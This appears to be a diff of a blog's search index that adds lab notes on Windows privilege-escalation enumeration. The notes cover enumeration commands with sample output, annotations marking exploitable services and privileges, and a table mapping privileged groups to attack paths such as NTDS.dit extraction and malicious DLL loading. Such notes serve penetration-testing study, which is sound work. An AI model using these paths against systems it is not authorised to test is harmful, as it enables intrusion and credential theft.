+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br></pre></td></tr></table></figure>
 
 
 <blockquote>
-<p>➜ Then we can dump hashes from the DC.</p>
+<p>Patch level </p>
 </blockquote>
-]]></content>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">wmic</span> <span class="title">qfe</span> <span class="title">list</span> <span class="title">brief</span></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span>&gt; <span class="built_in">Get-HotFix</span> | <span class="built_in">ft</span> <span class="literal">-AutoSize</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Environment variables</p>
+</blockquote>
+<blockquote>
+<p>If a writable directory appears early in <code>PATH</code> ( as home directory ) we can plant a malicious binary or DLL that gets loaded by a privileged process like DLL hijacking or binary planting.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">set</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span>&gt; <span class="built_in">Get-ChildItem</span> Env:</span><br><span class="line"></span><br><span class="line">➜ Check just the PATH</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span>&gt; <span class="variable">$env:PATH</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Running-Processes-Services"><a href="#Running-Processes-Services" class="headerlink" title="Running Processes &amp; Services"></a>Running Processes &amp; Services</h1><blockquote>
+<p>Reading tasklist</p>
+</blockquote>
+<blockquote>
+<p>We should look for anything non-standard: database servers, backup agents, VPN clients, monitoring tools, and especially anything running as SYSTEM or a service account.</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">tasklist</span> /<span class="title">svc</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Image</span> <span class="title">Name</span>          <span class="title">PID</span>  <span class="title">Services</span></span></span><br><span class="line"><span class="function">=================== ==== =====================================</span></span><br><span class="line"><span class="function"><span class="title">FileZilla</span> <span class="title">Server.exe</span> 1140 <span class="title">FileZilla</span> <span class="title">Server</span></span></span><br><span class="line"><span class="function"><span class="title">inSyncCPHwnet64.exe</span>  3324 <span class="title">inSyncCPHService</span>      &lt;-- <span class="title">Druva</span> <span class="title">inSync</span> 6.6.3 (<span class="title">vulnerable</span>!)</span></span><br><span class="line"><span class="function"><span class="title">MsMpEng.exe</span>         2136 <span class="title">WinDefend</span></span></span><br><span class="line"><span class="function"><span class="title">spoolsv.exe</span>         1884 <span class="title">Spooler</span>                &lt;-- <span class="title">PrintNightmare</span> <span class="title">target</span></span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-Process</span></span><br></pre></td></tr></table></figure>
+
+<p><code>If we see a process with &quot;Session ID &gt; 1&quot; this probably means there is another user logged in with us</code></p>
+<blockquote>
+<p>Network connections </p>
+</blockquote>
+<blockquote>
+<p>Services may be running on localhost-only ports (127.0.0.1) that are invisible to external scan and these are often less hardened because administrators assume <code>it&#39;s not accessible from the network.</code>.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; netstat -ano</span><br><span class="line"></span><br><span class="line">Proto  Local Address     Foreign Address  State      PID</span><br><span class="line">TCP    0.0.0.0:445       0.0.0.0:0        LISTENING  4</span><br><span class="line">TCP    0.0.0.0:3389      0.0.0.0:0        LISTENING  968</span><br><span class="line">TCP    127.0.0.1:14147   0.0.0.0:0        LISTENING  1140  &lt;-- FileZilla admin interface</span><br><span class="line">TCP    127.0.0.1:6064    0.0.0.0:0        LISTENING  3324  &lt;-- Druva inSync RPC</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="User-Group-Information"><a href="#User-Group-Information" class="headerlink" title="User &amp; Group Information"></a>User &amp; Group Information</h1><blockquote>
+<p>It tells us three critical things: </p>
+<ul>
+<li>Our identity</li>
+<li>Our group memberships</li>
+<li>Our assigned token privileges</li>
+</ul>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">whoami</span> /<span class="title">all</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">USER</span> <span class="title">INFORMATION</span></span></span><br><span class="line"><span class="function"><span class="title">User</span> <span class="title">Name</span>          <span class="title">SID</span></span></span><br><span class="line"><span class="function">================== =============================================</span></span><br><span class="line"><span class="function"><span class="title">winlpe</span>-<span class="title">srv01</span>\<span class="title">htb</span>-<span class="title">student</span>  <span class="title">S</span>-1-5-21-...-1002</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">GROUP</span> <span class="title">INFORMATION</span></span></span><br><span class="line"><span class="function"><span class="title">Group</span> <span class="title">Name</span>                           <span class="title">Type</span>  <span class="title">Attributes</span></span></span><br><span class="line"><span class="function">==================================== ===== ========================</span></span><br><span class="line"><span class="function"><span class="title">BUILTIN</span>\<span class="title">Backup</span> <span class="title">Operators</span>             <span class="title">Alias</span> <span class="title">Mandatory</span> <span class="title">group</span>, <span class="title">Enabled</span>  &lt;-- <span class="title">JACKPOT</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">PRIVILEGES</span> <span class="title">INFORMATION</span></span></span><br><span class="line"><span class="function"><span class="title">Privilege</span> <span class="title">Name</span>                <span class="title">Description</span>           <span class="title">State</span></span></span><br><span class="line"><span class="function">============================= ===================== ========</span></span><br><span class="line"><span class="function"><span class="title">SeImpersonatePrivilege</span>        <span class="title">Impersonate</span> <span class="title">a</span> <span class="title">client</span>  <span class="title">Enabled</span>   &lt;-- <span class="title">Potato</span> <span class="title">attack</span></span></span><br><span class="line"><span class="function"><span class="title">SeBackupPrivilege</span>             <span class="title">Back</span> <span class="title">up</span> <span class="title">files</span>         <span class="title">Disabled</span>  &lt;-- <span class="title">Can</span> <span class="title">be</span> <span class="title">enabled</span></span></span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>Group Memberships</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>Group</th>
+<th>Why it matters</th>
+<th>Attack path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Backup Operators</td>
+<td>Can read any file, log into DCs locally</td>
+<td>Extract NTDS.dit → Domain Admin</td>
+</tr>
+<tr>
+<td>Server Operators</td>
+<td>Full control over all services on servers&#x2F;DCs</td>
+<td>Modify service binpath → SYSTEM</td>
+</tr>
+<tr>
+<td>DnsAdmins</td>
+<td>Can load DLL into DNS service (runs as SYSTEM on DC)</td>
+<td>Malicious DLL → SYSTEM on DC</td>
+</tr>
+<tr>
+<td>Print Operators</td>
+<td>SeLoadDriverPrivilege — load kernel drivers</td>
+<td>Capcom.sys → SYSTEM</td>
+</tr>
+<tr>
+<td>Hyper-V Administrators</td>
+<td>Full Hyper-V access, can clone virtual DCs</td>
+<td>Clone DC VHDX → extract NTDS.dit</td>
+</tr>
+<tr>
+<td>Event Log Readers</td>
+<td>Read security event logs including 4688 process creation</td>
+<td>Find credentials in process command lines</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; net localgroup administrators</span><br><span class="line">C:\&gt; net localgroup &quot;Backup Operators&quot;</span><br><span class="line">C:\&gt; net localgroup &quot;Server Operators&quot;</span><br><span class="line">C:\&gt; net localgroup &quot;DnsAdmins&quot;</span><br><span class="line">C:\&gt; net localgroup &quot;Print Operators&quot;</span><br><span class="line">C:\&gt; net localgroup &quot;Hyper-V Administrators&quot;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Network-Information-Identifying-dual-homed-machines"><a href="#Network-Information-Identifying-dual-homed-machines" class="headerlink" title="Network Information : Identifying dual-homed machines"></a>Network Information : Identifying dual-homed machines</h1><blockquote>
+<p>IP Configuration</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">ipconfig</span> /<span class="title">all</span></span></span><br><span class="line"><span class="function"># <span class="title">Look</span> <span class="title">for</span> <span class="title">multiple</span> &quot;<span class="title">Ethernet</span> <span class="title">adapter</span>&quot; <span class="title">sections</span> <span class="title">with</span> <span class="title">different</span> <span class="title">IP</span> <span class="title">ranges</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Ethernet</span> <span class="title">adapter</span> <span class="title">Ethernet0</span>:   <span class="title">IPv4</span>: 10.129.43.8    &lt;-- <span class="title">External</span> <span class="title">network</span></span></span><br><span class="line"><span class="function"><span class="title">Ethernet</span> <span class="title">adapter</span> <span class="title">Ethernet1</span>:   <span class="title">IPv4</span>: 192.168.20.56  &lt;-- <span class="title">Internal</span> <span class="title">segment</span>!</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>ARP Table &#x2F; ARP Cache</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">arp</span> -<span class="title">a</span>          # <span class="title">Discover</span> <span class="title">other</span> <span class="title">hosts</span> <span class="title">passively</span></span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Routing Table</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">route</span> <span class="title">print</span>     # <span class="title">See</span> <span class="title">all</span> <span class="title">reachable</span> <span class="title">networks</span></span></span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
         <category>Windows</category>
-        <category>Privesc</category>
-        <category>Groups</category>
+        <category>Post-Exploitation</category>
+        <category>Windows Privesc</category>
+        <category>Windows Enumeration</category>
       </categories>
+      <tags>
+        <tag>systeminfo</tag>
+        <tag>whoami</tag>
+        <tag>tasklist</tag>
+        <tag>netstat</tag>
+        <tag>ipconfig</tag>
+        <tag>Get-HotFix</tag>
+        <tag>Get-Process</tag>
+        <tag>wmic</tag>
+      </tags>
   </entry>
 </search>
